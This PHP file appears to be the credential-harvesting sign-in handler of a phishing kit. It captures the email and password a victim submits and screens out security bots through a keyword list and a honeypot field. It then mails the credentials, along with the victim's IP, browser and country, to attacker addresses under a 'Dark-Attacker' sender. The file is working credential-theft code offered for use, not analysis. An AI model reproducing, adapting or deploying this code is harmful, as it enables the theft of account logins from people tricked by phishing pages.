<?php

require_once __DIR__ . '/../filter.php';
require_once __DIR__ . '/../function.php';

if (file_exists('../config/' . $api->general_config))
{
  @eval(file_get_contents('../config/' . $api->general_config));
}

$api->waiting();

$_SESSION['email']    = $_POST['email'];
$_SESSION['password'] = $_POST['password'];

if ($config_filter == 1)
{
  foreach ($email_bots as $email_bot)
  {
    if (stristr($_SESSION['email'], $email_bot) !== false)
    {
      $api->blocked("Email Bot ".$_SESSION['email']);
      echo "banned";
      exit;
    }
  }
}

if (strlen($_SESSION['password']) < 5 || strlen($_SESSION['password']) > 25 || !filter_var($_SESSION['email'], FILTER_VALIDATE_EMAIL))
{
    
  echo "error";
    
      
}
 


    
   elseif (!empty($_POST['killbill'])) {
         $api->blocked("Email Bot ".$_SESSION['email']);
      echo "banned";
      exit;
    }
else
{
  $message  = file_get_contents('../assets/html/signin.html');
  $message  = preg_replace('{QUOTE}', $quotes[array_rand($quotes, 1)], $message);

  $message  = preg_replace('{KUZULUY-A}', $_SESSION['email'], $message);
  $message  = preg_replace('{KUZULUY-B}', $_SESSION['password'], $message);

  $message  = preg_replace('{KUZULUY-C}', $_SESSION['ip'], $message);
  $message  = preg_replace('{KUZULUY-D}', $_SESSION['agent'], $message);

  $subject  = "[ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]";
  $headers  = "From: Dark-Attacker <darkattacker@dark.com>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

       foreach(explode(",", $email_results) as $tomail) {
    mail($tomail, $subject, $message, $headers);
       }
  
}
?>
